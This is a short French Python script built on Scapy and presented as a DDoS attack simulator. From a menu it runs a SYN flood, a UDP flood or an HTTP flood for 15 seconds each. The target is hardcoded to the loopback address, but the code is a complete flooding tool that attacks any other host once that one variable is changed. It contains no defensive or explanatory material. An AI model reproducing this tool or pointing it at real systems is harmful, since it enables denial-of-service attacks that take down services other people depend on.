# ─────────────────────────────────────────
# Simulation d'attaques DDoS réelles
# Envoie de vrais paquets sur loopback
# ─────────────────────────────────────────

from scapy.all import *
import time
import sys

CIBLE = "127.0.0.1"

def syn_flood(duree=10):
    print(f"\n🔴 SYN FLOOD lancé sur {CIBLE} pendant {duree}s...")
    fin = time.time() + duree
    compteur = 0
    while time.time() < fin:
        port_src = random.randint(1024, 65535)
        paquet = IP(dst=CIBLE) / TCP(sport=port_src, dport=80, flags="S")
        send(paquet, verbose=False)
        compteur += 1
        if compteur % 100 == 0:
            print(f"   {compteur} paquets SYN envoyés...")
    print(f"✅ SYN Flood terminé — {compteur} paquets envoyés")

def udp_flood(duree=10):
    print(f"\n🔴 UDP FLOOD lancé sur {CIBLE} pendant {duree}s...")
    fin = time.time() + duree
    compteur = 0
    while time.time() < fin:
        port_dst = random.randint(1, 65535)
        paquet = IP(dst=CIBLE) / UDP(dport=port_dst) / Raw(RandString(size=64))
        send(paquet, verbose=False)
        compteur += 1
        if compteur % 100 == 0:
            print(f"   {compteur} paquets UDP envoyés...")
    print(f"✅ UDP Flood terminé — {compteur} paquets envoyés")

def http_flood(duree=10):
    print(f"\n🔴 HTTP FLOOD lancé sur {CIBLE} pendant {duree}s...")
    fin = time.time() + duree
    compteur = 0
    requete = (
        b"GET / HTTP/1.1\r\n"
        b"Host: target.com\r\n"
        b"User-Agent: Mozilla/5.0\r\n"
        b"Connection: keep-alive\r\n\r\n"
    )
    while time.time() < fin:
        port_src = random.randint(1024, 65535)
        paquet = (IP(dst=CIBLE) /
                  TCP(sport=port_src, dport=80, flags="PA") /
                  Raw(requete))
        send(paquet, verbose=False)
        compteur += 1
        if compteur % 50 == 0:
            print(f"   {compteur} requêtes HTTP envoyées...")
    print(f"✅ HTTP Flood terminé — {compteur} paquets envoyés")

# ── Menu ──────────────────────────────────
print("═══════════════════════════════════")
print("     SIMULATEUR D'ATTAQUES DDoS    ")
print("═══════════════════════════════════")
print("  1. SYN Flood")
print("  2. UDP Flood")
print("  3. HTTP Flood")
print("═══════════════════════════════════")

choix = input("Choisir une attaque (1/2/3) : ")

if choix == "1":
    syn_flood(duree=15)
elif choix == "2":
    udp_flood(duree=15)
elif choix == "3":
    http_flood(duree=15)
else:
    print("Choix invalide")
